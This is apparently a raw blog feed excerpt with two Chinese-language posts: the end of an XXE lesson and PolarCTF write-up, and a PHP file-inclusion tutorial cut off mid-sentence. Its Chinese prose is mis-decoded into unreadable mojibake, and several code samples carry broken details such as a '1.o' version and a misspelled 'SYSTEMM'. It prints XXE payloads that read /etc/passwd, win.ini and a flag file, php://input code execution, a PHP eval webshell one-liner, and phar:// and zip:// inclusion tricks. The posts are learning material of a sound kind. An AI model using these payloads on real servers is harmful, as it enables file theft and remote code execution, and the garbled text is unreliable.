xxx.com&quot;&gt;<br><br>&lt;test&gt;&amp;writer;@right;&lt;/test&gt;<br></code></pre></td></tr></table></figure><p>å¤–éƒ¨å®ä½“ï¼š</p><p><code>&lt;!ENTITYå®ä½“åç§°SYSTEM&quot;URI/URL&quot;&gt;</code>æˆ–è€…<code>&lt;!ENTITYå®ä½“åç§°PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version = &quot;1.o&quot; Ã©encoding = &quot;utf-8&quot;?&gt;<br>2&lt;!DOCTYPE test [<br>3&lt;!ENTITY file SYSTEMM &quot;file:///flag&quot;&gt;<br>4&lt;!ENTITY copyright SYSTEM &quot;http://www.xXx.com/xxx.dtd&quot;&gt;<br>5[&gt;<br>6&lt;author&gt;&amp;file;@right;&lt;/author&gt;<br></code></pre></td></tr></table></figure><p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªå†…éƒ¨å®ä½“çš„ä¾‹å­ï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE foo [<br>&lt;!ELEMENT foo ANY &gt;<br>&lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæ˜¯anyæ¥å—ä»»ä½•å…ƒç´ ï¼Œè€Œä¸”å®šä¹‰äº†ä¸€ä¸ªXMLçš„å†…éƒ¨å®ä½“ï¼Œè€Œå®ä½“å¯ä»¥é€šè¿‡&amp;åœ¨XMLä¸­å¼•ç”¨</p><p>å¦‚ä¸‹ï¼šè¿™å¯¹ä¸Šé¢å®šä¹‰çš„å†…éƒ¨å®ä½“çš„xxeè¿›è¡Œäº†å¼•ç”¨ï¼Œè§£æçš„æ—¶å€™&xxe;å°±ä¼šè¢«æ›¿æ¢æˆtest</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;creds&gt;<br>&lt;user&gt;&amp;xxe;&lt;/user&gt;<br>&lt;pass&gt;mypass&lt;/pass&gt;<br>&lt;/creds&gt;<br></code></pre></td></tr></table></figure><h2 id="ç»§ç»­æ·±å…¥"><a href="#ç»§ç»­æ·±å…¥" class="headerlink" title="ç»§ç»­æ·±å…¥"></a><strong>ç»§ç»­æ·±å…¥</strong></h2><p>å…¶å®å®ä½“ä¹Ÿèƒ½ä»<strong>å¤–éƒ¨çš„DTDæ–‡ä»¶</strong>ä¸­æ¥å¼•ç”¨ï¼Œä¹Ÿå°±æ˜¯å¤–éƒ¨å®ä½“ã€‚</p><p>å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE foo [<br>&lt;!ELEMENT foo ANY &gt;<br>&lt;!ENTITY xxe SYSTEM &quot;file:///c:/test.dtd&quot; &gt;]&gt;<br>&lt;creds&gt;<br>    &lt;user&gt;&amp;xxe;&lt;/user&gt;<br>    &lt;pass&gt;mypass&lt;/pass&gt;<br>&lt;/creds&gt;<br></code></pre></td></tr></table></figure><p>å¦‚æœè¿™æ ·é…ç½®å¼•ç”¨çš„è¯ï¼Œå¯¹ç½‘ç«™èµ„æºæ‰€åšçš„ä»»ä½•æ›´æ”¹éƒ½ä¼šåœ¨æ–‡æ¡£ä¸­è‡ªåŠ¨æ›´æ–°ï¼Œå°±å¾ˆæ–¹ä¾¿ï¼Œä½†æ˜¯è¿™æ ·çš„å®‰å…¨é£é™©å°±å¾ˆå¤§äº†ã€‚</p><p>åœ¨XMLä¸­é™¤äº†æŠŠå®ä½“åˆ†æˆå¤–éƒ¨å’Œå†…éƒ¨å®ä½“ï¼Œè¿˜èƒ½åˆ†æˆå‚æ•°å’Œé€šç”¨å®ä½“ã€‚</p><p><strong>é€šç”¨å®ä½“</strong></p><p>é€šç”¨å®ä½“ï¼š<code>&lt;ï¼ENTITYå®ä½“åç§°â€œå®ä½“å†…å®¹&quot;&gt;</code>ï¼Œè€Œæƒ³è¦å¼•ç”¨ä¸€èˆ¬å®ä½“ï¼Œç”¨<code>&amp;å®ä½“åç§°</code>ï¼ˆå¼•ç”¨åŒºåŸŸä¸é™)</p><p>ä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; <br>&lt;!DOCTYPE updateProfile [&lt;!ENTITY file SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt; ]&gt; <br>&lt;updateProfile&gt;  <br>    &lt;firstname&gt;Joe&lt;/firstname&gt;  <br>    &lt;lastname&gt;&amp;file;&lt;/lastname&gt;  <br>    ... <br>&lt;/updateProfile&gt;<br></code></pre></td></tr></table></figure><p><strong>å‚æ•°å®ä½“</strong></p><p>1.ä½¿ç”¨<code>%(ç©ºæ ¼)name</code> åœ¨DTDä¸­å®šä¹‰ï¼Œä¸”åªèƒ½åœ¨DTDä¸­ä½¿ç”¨<code>%name</code>;</p><p>2.åœ¨DTDä¸­å‚æ•°å®ä½“çš„å£°æ˜æ‰èƒ½å¼•ç”¨å…¶ä»–å®ä½“</p><p>3.å‚æ•°å®ä½“å¯ä»¥å¤–éƒ¨å¼•ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; <br>&lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt; <br>%an-element; %remote-dtd;<br></code></pre></td></tr></table></figure><h2 id="0x01-ä¾‹é¢˜"><a href="#0x01-ä¾‹é¢˜" class="headerlink" title="0x01 ä¾‹é¢˜"></a>0x01 ä¾‹é¢˜</h2><p>é¢˜ç›®åœ°å€ï¼šPolarCTF:XXE</p><h2 id="0x02-æ¼æ´æŒ–æ˜"><a href="#0x02-æ¼æ´æŒ–æ˜" class="headerlink" title="0x02 æ¼æ´æŒ–æ˜"></a>0x02 æ¼æ´æŒ–æ˜</h2><p>è®¿é—®phpinfoé¡µé¢ï¼Œå¯ä»¥çœ‹åˆ°libxmlç‰ˆæœ¬æ˜¯2.8.0ï¼Œé»˜è®¤æ˜¯è§£æå¤–éƒ¨å®ä½“çš„</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/2357704-20211122105757476-1334037430.png" alt="img"></p><p>ä¸¢å¾¡å‰‘æ‰«ä¸€ä¸‹è¿˜æœ‰ä»€ä¹ˆç›®å½•</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/2357704-20211122111747090-407076212.png" alt="img"></p><p> è¿™é‡Œè®¿é—®dom.php</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20251017213859748.png" alt="image-20251017213859748"></p><p>è¿™ä¸ª PHP è­¦å‘Šçš„æ„æ€æ˜¯ï¼š<code>DOMDocument::loadXML()</code> å‡½æ•°æ¥æ”¶åˆ°çš„æ˜¯ä¸€ä¸ª<strong>ç©ºå­—ç¬¦ä¸²</strong>ï¼Œä¹Ÿå°±æ˜¯è¯´ PHP æ²¡æœ‰æ‹¿åˆ°ä»»ä½•å¯ä»¥è§£æçš„ XML å†…å®¹ã€‚</p><h2 id="0x03-æ¼æ´å¤ç°"><a href="#0x03-æ¼æ´å¤ç°" class="headerlink" title="0x03 æ¼æ´å¤ç°"></a>0x03 æ¼æ´å¤ç°</h2><p> é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªdomæ¥è¿›è¡Œæ³¨å…¥</p><p>ä¸€èˆ¬æˆ‘ä»¬ç”¨XMLå¤–éƒ¨å®ä½“è¯»å–å¯ä»¥è¿™æ ·å†™XMLï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE foo [<br>&lt;!ELEMENT foo ANY &gt;<br>&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;<br>    &lt;user&gt;<br><br>&lt;name&gt;&amp;xxe;&lt;/name&gt;<br><br>&lt;/user&gt;<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯å½“å­˜åœ¨æ— å›æ˜¾æƒ³è¦è¯»å–æ•æ„Ÿæ–‡ä»¶çš„æ—¶å€™ï¼Œå°±éœ€è¦ç”¨åˆ°<code>fileåè®®</code>å¹¶ä¸”æ•°æ®å¤–å¸¦äº†ã€‚ä¹Ÿå°±æ˜¯<code>Bind OOB XXE</code>ã€‚</p><p>é€šè¿‡ä¸Šé¢çš„äº†è§£ï¼Œæˆ‘ä»¬å†™ä¸€æ®µXML</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">GET /dom.php HTTP/1.1<br>Host: 37550f88-4046-492a-94e8-d3e6e34e774a.www.polarctf.com:8090<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Accept-Encoding: gzip, deflate, br<br>Accept-Language: zh-CN,zh;q=0.9<br>Connection: close<br>Content-Length: 230<br><br>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE foo [<br>&lt;!ELEMENT foo ANY &gt;<br>&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64encode/resource=file:///var/www/html/flagggg.php&quot; &gt;]&gt;<br>    &lt;user&gt;<br><br>&lt;name&gt;&amp;xxe;&lt;/name&gt;<br><br>&lt;/user&gt;<br><br></code></pre></td></tr></table></figure><h1 id="references"><a href="#references" class="headerlink" title="references"></a>references</h1><p><a href="https://www.cnblogs.com/byErichas/p/15588851.html">Vulhub-XXE&amp;Bind OOB XXE å¤ç°(è¶…çº§è¯¦ç»†) - Erichas - åšå®¢å›­</a></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
      <category>åŸºç¡€çŸ¥è¯†</category>
      
      <category>å®æ“</category>
      
    </categories>
    
    
    <tags>
      
      <tag>XXE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ–‡ä»¶åŒ…å«æ¼æ´å­¦ä¹ </title>
    <link href="/2025/10/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <url>/2025/10/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="æ–‡ä»¶åŒ…å«æ¼æ´å­¦ä¹ "><a href="#æ–‡ä»¶åŒ…å«æ¼æ´å­¦ä¹ " class="headerlink" title="æ–‡ä»¶åŒ…å«æ¼æ´å­¦ä¹ "></a>æ–‡ä»¶åŒ…å«æ¼æ´å­¦ä¹ </h1><h2 id="1-æ–‡ä»¶åŒ…å«æ¼æ´æ¦‚è¿°"><a href="#1-æ–‡ä»¶åŒ…å«æ¼æ´æ¦‚è¿°" class="headerlink" title="1.æ–‡ä»¶åŒ…å«æ¼æ´æ¦‚è¿°"></a>1.æ–‡ä»¶åŒ…å«æ¼æ´æ¦‚è¿°</h2><p>å’ŒSQLæ³¨å…¥ç­‰æ”»å‡»æ–¹å¼ä¸€æ ·ï¼Œæ–‡ä»¶åŒ…å«æ¼æ´ä¹Ÿæ˜¯ä¸€ç§æ³¨å…¥å‹æ¼æ´ï¼Œå…¶æœ¬è´¨å°±æ˜¯è¾“å…¥ä¸€æ®µç”¨æˆ·èƒ½å¤Ÿæ§åˆ¶çš„è„šæœ¬æˆ–è€…ä»£ç ï¼Œå¹¶è®©æœåŠ¡ç«¯æ‰§è¡Œã€‚</p><p>ä»€ä¹ˆå«åŒ…å«å‘¢ï¼Ÿä»¥PHPä¸ºä¾‹ï¼Œæˆ‘ä»¬å¸¸å¸¸æŠŠå¯é‡å¤ä½¿ç”¨çš„å‡½æ•°å†™å…¥åˆ°å•ä¸ªæ–‡ä»¶ä¸­ï¼Œåœ¨ä½¿ç”¨è¯¥å‡½æ•°æ—¶ï¼Œç›´æ¥è°ƒç”¨æ­¤æ–‡ä»¶ï¼Œè€Œæ— éœ€å†æ¬¡ç¼–å†™å‡½æ•°ï¼Œè¿™ä¸€è¿‡ç¨‹å«åšåŒ…å«ã€‚</p><p>ä»¥PHPä¸ºä¾‹,å¸¸ç”¨çš„æ–‡ä»¶åŒ…å«å‡½æ•°æœ‰ä»¥ä¸‹å››ç§<br>include(),require(),include_once(),require_once()</p><p>åŒºåˆ«å¦‚ä¸‹:</p><p>require():æ‰¾ä¸åˆ°è¢«åŒ…å«çš„æ–‡ä»¶ä¼šäº§ç”Ÿè‡´å‘½é”™è¯¯ï¼Œå¹¶åœæ­¢è„šæœ¬è¿è¡Œ<br>include():æ‰¾ä¸åˆ°è¢«åŒ…å«çš„æ–‡ä»¶åªä¼šäº§ç”Ÿè­¦å‘Šï¼Œè„šæœ¬ç»§ç»­æ‰§è¡Œ<br>require_once()ä¸require()ç±»ä¼¼:å”¯ä¸€çš„åŒºåˆ«æ˜¯å¦‚æœè¯¥æ–‡ä»¶çš„ä»£ç å·²ç»è¢«åŒ…å«ï¼Œåˆ™ä¸ä¼šå†æ¬¡åŒ…å«<br>include_once()ä¸include()ç±»ä¼¼:å”¯ä¸€çš„åŒºåˆ«æ˜¯å¦‚æœè¯¥æ–‡ä»¶çš„ä»£ç å·²ç»è¢«åŒ…å«ï¼Œåˆ™ä¸ä¼šå†æ¬¡åŒ…å«</p><p>æ¼æ´æˆå› ä¸ºï¼šå½“åˆ©ç”¨è¿™å››ä¸ªå‡½æ•°æ¥åŒ…å«æ–‡ä»¶æ—¶ï¼Œä¸ç®¡æ–‡ä»¶æ˜¯ä»€ä¹ˆç±»å‹ï¼ˆå›¾ç‰‡ã€txtç­‰ç­‰ï¼‰ï¼Œéƒ½ä¼šç›´æ¥ä½œä¸ºphpæ–‡ä»¶è¿›è¡Œè§£æã€‚</p><p>åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ï¼Œæˆ‘ä»¬å¯ä»¥è¯»å–åŒ…å«æ•æ„Ÿä¿¡æ¯çš„æ–‡ä»¶ã€‚</p><h2 id="2-æœ¬åœ°æ–‡ä»¶åŒ…å«LFI-Local-File-Inclusion"><a href="#2-æœ¬åœ°æ–‡ä»¶åŒ…å«LFI-Local-File-Inclusion" class="headerlink" title="2.æœ¬åœ°æ–‡ä»¶åŒ…å«LFI(Local File Inclusion)"></a>2.æœ¬åœ°æ–‡ä»¶åŒ…å«LFI(Local File Inclusion)</h2><p>æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œé¡¾åæ€ä¹‰ï¼ŒæŒ‡çš„æ˜¯èƒ½æ‰“å¼€å¹¶åŒ…å«æœ¬åœ°æ–‡ä»¶çš„æ¼æ´ã€‚å¤§éƒ¨åˆ†æƒ…å†µä¸‹é‡åˆ°çš„æ–‡ä»¶åŒ…å«æ¼æ´éƒ½æ˜¯LFIã€‚</p><h2 id="3-è¿œç¨‹æ–‡ä»¶åŒ…å«RFI-Remote-File-Inclusion"><a href="#3-è¿œç¨‹æ–‡ä»¶åŒ…å«RFI-Remote-File-Inclusion" class="headerlink" title="3.è¿œç¨‹æ–‡ä»¶åŒ…å«RFI(Remote File Inclusion)"></a>3.è¿œç¨‹æ–‡ä»¶åŒ…å«RFI(Remote File Inclusion)</h2><p>è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ã€‚æ˜¯æŒ‡èƒ½å¤ŸåŒ…å«è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶å¹¶æ‰§è¡Œã€‚ç”±äºè¿œç¨‹æœåŠ¡å™¨çš„æ–‡ä»¶æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œå› æ­¤æ¼æ´ä¸€æ—¦å­˜åœ¨å±å®³æ€§ä¼šå¾ˆå¤§ã€‚<br>ä½†RFIçš„åˆ©ç”¨æ¡ä»¶è¾ƒä¸ºè‹›åˆ»ï¼Œéœ€è¦php.iniä¸­è¿›è¡Œé…ç½®</p><ol><li>allow_url_fopen &#x3D; On</li><li>allow_url_include &#x3D; On</li></ol><p>ä¸¤ä¸ªé…ç½®é€‰é¡¹å‡éœ€è¦ä¸ºOnï¼Œæ‰èƒ½è¿œç¨‹åŒ…å«æ–‡ä»¶æˆåŠŸã€‚</p><p>åœ¨php.iniä¸­ï¼Œallow_url_fopené»˜è®¤ä¸€ç›´æ˜¯Onï¼Œè€Œallow_url_includeä»php5.2ä¹‹åå°±é»˜è®¤ä¸ºOffã€‚</p><h2 id="4-åŒ…å«å§¿åŠ¿"><a href="#4-åŒ…å«å§¿åŠ¿" class="headerlink" title="4.åŒ…å«å§¿åŠ¿"></a>4.åŒ…å«å§¿åŠ¿</h2><h3 id="file-åè®®"><a href="#file-åè®®" class="headerlink" title="file:&#x2F;&#x2F;åè®®"></a>file:&#x2F;&#x2F;åè®®</h3><p>**file:&#x2F;&#x2F;**ç”¨äºè®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼Œåœ¨CTFä¸­é€šå¸¸ç”¨æ¥è¯»å–æœ¬åœ°æ–‡ä»¶çš„ä¸”ä¸å—allow_url_fopenä¸allow_url_includeçš„å½±å“ã€‚</p><p>å§¿åŠ¿ï¼š</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-keyword">file</span>:<span class="hljs-comment">// [æ–‡ä»¶çš„ç»å¯¹è·¯å¾„å’Œæ–‡ä»¶å]</span><br></code></pre></td></tr></table></figure><h3 id="php-åè®®"><a href="#php-åè®®" class="headerlink" title="php:&#x2F;&#x2F;åè®®"></a>php:&#x2F;&#x2F;åè®®</h3><h4 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h4><p><strong>php:&#x2F;&#x2F;input</strong>å¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµ, å°†postè¯·æ±‚ä¸­çš„æ•°æ®ä½œä¸ºPHPä»£ç æ‰§è¡Œã€‚å½“ä¼ å…¥çš„å‚æ•°ä½œä¸ºæ–‡ä»¶åæ‰“å¼€æ—¶ï¼Œå¯ä»¥å°†å‚æ•°è®¾ä¸ºphp:&#x2F;&#x2F;input,åŒæ—¶postæƒ³è®¾ç½®çš„æ–‡ä»¶å†…å®¹ï¼Œphpæ‰§è¡Œæ—¶ä¼šå°†postå†…å®¹å½“ä½œæ–‡ä»¶å†…å®¹ã€‚ä»è€Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚</p><p>åˆ©ç”¨æ¡ä»¶ï¼š</p><ol><li>allow_url_include &#x3D; Onã€‚</li><li>å¯¹allow_url_fopenä¸åšè¦æ±‚ã€‚</li></ol><p>å§¿åŠ¿ï¼š</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-keyword">index</span>.php<br>?<span class="hljs-keyword">file</span>=php:<span class="hljs-comment">//input</span><br><br>POST:<br>&lt;? phpinfo();?&gt;<br></code></pre></td></tr></table></figure><h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h4><p><strong>php:&#x2F;&#x2F;filter</strong>è¯»å–æºä»£ç å¹¶è¿›è¡Œbase64ç¼–ç è¾“å‡ºï¼Œä¸ç„¶ä¼šç›´æ¥å½“åšphpä»£ç æ‰§è¡Œå°±çœ‹ä¸åˆ°æºä»£ç å†…å®¹äº†ã€‚</p><p>åˆ©ç”¨æ¡ä»¶ï¼šæ— ç”š</p><p>å§¿åŠ¿ï¼š</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-built_in">index</span>.php?<span class="hljs-keyword">file</span>=php://<span class="hljs-built_in">filter</span>/<span class="hljs-keyword">read</span>=convert.base64-encode/resource=<span class="hljs-built_in">index</span>.php<br></code></pre></td></tr></table></figure><p>é€šè¿‡æŒ‡å®šæœ«å°¾çš„æ–‡ä»¶ï¼Œå¯ä»¥è¯»å–ç»base64åŠ å¯†åçš„æ–‡ä»¶æºç ï¼Œä¹‹åå†base64è§£ç ä¸€ä¸‹å°±è¡Œã€‚</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">&gt;&gt;&gt; import base64</span><br><span class="language-xml">&gt;&gt;&gt; base64.b64decode(&quot;PD9waHAgDQoJJGZpbGUgPSAkX0dFVFsnZmlsZSddOw0KCWluY2x1ZGUgJGZpbGU7DQo/Pg==&quot;)</span><br><span class="language-xml">b&quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> \r\n\t<span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];\r\n\tinclude <span class="hljs-variable">$file</span>;\r\n<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;</span><br></code></pre></td></tr></table></figure><p>å…¶ä»–å§¿åŠ¿ï¼š</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-built_in">index</span>.php?<span class="hljs-keyword">file</span>=php://<span class="hljs-built_in">filter</span>/convert.base64-encode/resource=<span class="hljs-built_in">index</span>.php<br></code></pre></td></tr></table></figure><p>æ•ˆæœè·Ÿå‰é¢ä¸€æ ·ï¼Œå°‘äº†readç­‰å…³é”®å­—ã€‚åœ¨ç»•è¿‡ä¸€äº›wafæ—¶ä¹Ÿè®¸æœ‰ç”¨ã€‚</p><h4 id="phar"><a href="#phar" class="headerlink" title="phar:&#x2F;&#x2F;"></a>phar:&#x2F;&#x2F;</h4><p>pharå°±æ˜¯phpå‹ç¼©æ–‡æ¡£ã€‚å®ƒå¯ä»¥æŠŠå¤šä¸ªæ–‡ä»¶å½’æ¡£åˆ°åŒä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œè€Œä¸”ä¸ç»è¿‡è§£å‹å°±èƒ½è¢« php è®¿é—®å¹¶æ‰§è¡Œï¼Œä¸file:&#x2F;&#x2F; php:&#x2F;&#x2F;ç­‰ç±»ä¼¼ï¼Œä¹Ÿæ˜¯ä¸€ç§æµåŒ…è£…å™¨ã€‚</p><p>ä½¿ç”¨<code>Phar://</code>ä¼ªåè®®æµå¯ä»¥Bypassä¸€äº›ä¸Šä¼ çš„wafï¼Œå¤§å¤šæ•°æƒ…å†µä¸‹å’Œæ–‡ä»¶åŒ…å«ä¸€èµ·ä½¿ç”¨ï¼Œå°±ç±»ä¼¼äºæˆ‘ä»¬çš„å‹ç¼©åŒ…ï¼ˆå…¶å®å°±æ˜¯ä¸€ä¸ªå‹ç¼©åŒ…ï¼‰ï¼Œåªä¸è¿‡æˆ‘ä»¬æ¢äº†ä¸€ç§æ–¹å¼å»æ‰§è¡Œè€Œå·²</p><p>å†™ä¸€æ®µå°ä»£ç æµ‹è¯•ä¸€ä¸‹ï¼š<br>test.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ç„¶åå°†test.phpå‹ç¼©ä¸ºtest.zipï¼Œå°†å‹ç¼©æ–‡ä»¶æ”¹åç¼€ä¸º<code>.jpg</code><br>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;phar://./test.jpg/test.php&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æˆåŠŸåŒ…å«</p><p><img src="D:\work\temp\PixPin_2025-09-09_17-55-36.png" alt="PixPin_2025-09-09_17-55-36"></p><p>åˆ©ç”¨æ¡ä»¶ï¼š</p><ol><li>phpç‰ˆæœ¬å¤§äºç­‰äºphp5.3.0</li></ol><p>å§¿åŠ¿ï¼š</p><p>å‡è®¾æœ‰ä¸ªæ–‡ä»¶phpinfo.txtï¼Œå…¶å†…å®¹ä¸º<code>&lt;?php phpinfo(); ?&gt;</code>ï¼Œæ‰“åŒ…æˆzipå‹ç¼©åŒ…ï¼Œå¦‚ä¸‹ï¼š</p><p>æŒ‡å®šç»å¯¹è·¯å¾„</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">index.php?file=phar:<span class="hljs-regexp">//</span>D:<span class="hljs-regexp">/phpStudy/</span>WWW<span class="hljs-regexp">/fileinclude/</span>test.zip/phpinfo.txt<br></code></pre></td></tr></table></figure><p>æˆ–è€…ä½¿ç”¨ç›¸å¯¹è·¯å¾„ï¼ˆè¿™é‡Œtest.zipå°±åœ¨å½“å‰ç›®å½•ä¸‹ï¼‰</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-keyword">index</span>.php?<span class="hljs-keyword">file</span>=phar:<span class="hljs-comment">//test.zip/phpinfo.txt</span><br></code></pre></td></tr></table></figure><h3 id="zip-åè®®"><a href="#zip-åè®®" class="headerlink" title="zip:&#x2F;&#x2F;åè®®"></a>zip:&#x2F;&#x2F;åè®®</h3><p>åˆ©ç”¨æ¡ä»¶ï¼š</p><ol><li>phpç‰ˆæœ¬å¤§äºç­‰äºphp5.3.0</li></ol><p>å§¿åŠ¿ï¼š<br>æ„é€ zipåŒ…çš„æ–¹æ³•åŒpharã€‚</p><p>ä½†ä½¿ç”¨zipåè®®ï¼Œéœ€è¦æŒ‡å®š<strong>ç»å¯¹è·¯å¾„</strong>ï¼ŒåŒæ—¶å°†<code>#</code>ç¼–ç ä¸º<code>%23</code>ï¼Œä¹‹åå¡«ä¸Šå‹ç¼©åŒ…å†…çš„æ–‡ä»¶ã€‚</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-keyword">index</span>.php?<span class="hljs-keyword">file</span>=zip:<span class="hljs-comment">//D:\phpStudy\WWW\fileinclude\test.zip%23phpinfo.txt</span><br></code></pre></td></tr></table></figure><h3 id="date-åè®®"><a href="#date-åè®®" class="headerlink" title="date:&#x2F;&#x2F;åè®®"></a>date:&#x2F;&#x2F;åè®®</h3><p>data:&#x2F;&#x2F; åŒæ 